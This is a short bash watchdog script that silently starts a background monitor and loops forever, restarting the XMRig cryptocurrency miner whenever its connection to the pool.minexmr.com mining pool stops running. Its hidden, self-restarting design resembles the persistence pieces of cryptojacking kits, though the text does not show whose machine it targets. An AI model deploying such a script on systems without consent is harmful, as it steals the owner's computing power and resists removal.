#!/bin/bash
function CheckProcess()
{
# Check whether the parameter is present
        if [ "$1" = "" ];then
            return 1
        fi

# $PROCESS_NUM is the number of $1
        PROCESS_NUM=`ps -ef | grep "$1" | grep -v "grep" | wc -l`
        if [ $PROCESS_NUM != 0 ];then
            return 1
        else
            return 0
        fi
}

./monitor2.sh >/dev/null 2>&1 &  
while [ 1 ] ; do
        CheckProcess "./xmrig -o pool.minexmr.com:443"
        if [ $? == 0 ];then
    # restart xxx
    ./run.sh start
    fi

    #add other process...

sleep 5
done &


